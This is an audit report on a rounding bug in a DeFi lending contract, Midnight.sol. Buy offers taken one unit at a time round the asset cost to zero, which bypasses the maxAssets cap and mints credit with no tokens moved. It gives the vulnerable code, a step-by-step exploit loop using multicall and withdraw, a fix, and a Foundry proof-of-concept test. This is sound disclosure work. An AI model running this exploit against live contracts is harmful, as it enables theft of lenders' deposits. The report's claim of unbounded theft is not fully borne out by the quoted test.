Audit Report

## Title
Buy offer `maxAssets` cap bypass via dust rounding enables unbounded unbacked credit creation - (`File: src/Midnight.sol`)

## Summary
When a buy offer has `maxAssets > 0` and `offer.tick < MAX_TICK` (i.e., `buyerPrice < WAD`), calling `take` with `units = 1` causes `buyerAssets = mulDivDown(1, buyerPrice, WAD) = 0`. The `consumed` counter increments by zero, so the cap check `require(newConsumed <= offer.maxAssets)` always passes regardless of repetition. Each call increases the maker's `position.credit` by 1 unit while transferring zero loan tokens, inflating credit supply without any asset backing and enabling direct theft of other lenders' deposits.

## Finding Description
**Exact code path** — `src/Midnight.sol` lines 363–369:

```solidity
uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
// = mulDivDown(1, buyerPrice, WAD) = 0 when buyerPrice < WAD

if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
    // += 0, newConsumed never grows
    require(newConsumed <= offer.maxAssets, ConsumedAssets()); // always passes
}
``` [1](#0-0) 

**Root cause**: For a buy offer, the consumed counter tracks `buyerAssets` (an asset-denominated value), not `units`. When `buyerPrice < WAD` (any tick below `MAX_TICK`) and `units = 1`, `mulDivDown(1, buyerPrice, WAD)` rounds to zero. The cap is never consumed regardless of how many times the offer is taken.

**Credit inflation path** — lines 382 and 410:

```solidity
uint256 buyerCreditIncrease = UtilsLib.zeroFloorSub(units, buyerPos.debt); // = 1 if no debt
buyerPos.credit += UtilsLib.toUint128(buyerCreditIncrease);                // +1 per call
``` [2](#0-1) [3](#0-2) 

**Zero asset transfer** — lines 455–456:

```solidity
SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets); // 0
SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);                   // 0
``` [4](#0-3) 

**Exploit flow**:
1. Attacker (maker) creates a buy offer: `maxAssets = 1`, `tick = MAX_TICK - 16` (or any tick < MAX_TICK), authorizes any ratifier.
2. Any taker (or the attacker themselves via `multicall`) calls `midnight.take(offer, ratifierData, 1, taker, ...)` in a loop.
3. Each iteration: `buyerAssets = 0`, `newConsumed` stays at 0, cap check passes, `buyerPos.credit += 1`, zero tokens move.
4. After N iterations, maker holds N unbacked credit units and calls `withdraw` to redeem real loan tokens deposited by other lenders.

**Why existing checks fail**: The `ConsumedAssets` check at line 369 is the sole cap enforcement and compares `newConsumed` (which never increases) against `maxAssets`. No minimum-units or minimum-assets floor exists. The `atMostOneNonZero` check at line 350 only prevents both caps being set simultaneously — it does not prevent the zero-rounding bypass. [5](#0-4) 

## Impact Explanation
The maker's `position[id][buyer].credit` increases by 1 unit per call with no corresponding loan token deposited. `totalUnits` also grows by 1 per call. This breaks the invariant that every credit unit has a matching asset in the contract. Via `withdraw`, the attacker can redeem these phantom credits against real loan tokens deposited by other lenders, causing direct, quantifiable loss proportional to the number of `take` calls executed. The attack is repeatable within a single transaction via `multicall`, making the loss unbounded.

## Likelihood Explanation
Preconditions are minimal: any buy offer with `tick < MAX_TICK` (virtually all real offers, since `MAX_TICK` corresponds to price = 1.0 = par) and `maxAssets` set to any nonzero value. The attacker is the maker — a normal, unprivileged user. No governance, admin, or leaked key is required. The attack is executable in a single transaction via `multicall`.

## Recommendation
When `maxAssets > 0` and the offer is a buy offer, require that `buyerAssets > 0` before proceeding, or track `units` consumed (not `buyerAssets`) in the `maxAssets` branch. The simplest targeted fix:

```solidity
if (offer.maxAssets > 0) {
    uint256 assetsDelta = offer.buy ? buyerAssets : sellerAssets;
    require(assetsDelta > 0, ZeroAssets()); // prevent dust bypass
    newConsumed = consumed[offer.maker][offer.group] += assetsDelta;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
```

Alternatively, enforce a minimum `units` floor derived from `maxAssets` and the offer price before the consumed update.

## Proof of Concept
The protocol's own test suite contains `testBugBuyMaxAssetsBypass` at `test/TakeTest.sol` lines 858–889, explicitly named as a bug test. It pre-sets `consumed` to `maxAssets` (fully consumed offer), then calls `take(1, borrower, lenderOffer)` and asserts:

- `buyerAssets == 0`, `sellerAssets == 0`
- `consumed` unchanged at `maxAssets`
- Token balances of lender and borrower unchanged
- `creditOf(id, lender) > lenderCreditBefore` ✓
- `debtOf(id, borrower) > borrowerDebtBefore` ✓
- `totalUnits(id) > totalUnitsBefore` ✓ [6](#0-5) 

This test is a complete, self-contained reproduction of the vulnerability. Running it with `forge test --match-test testBugBuyMaxAssetsBypass` will pass, confirming the bug.

    // Show that a buy offer with offerPrice < WAD can be taken with units > 0
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
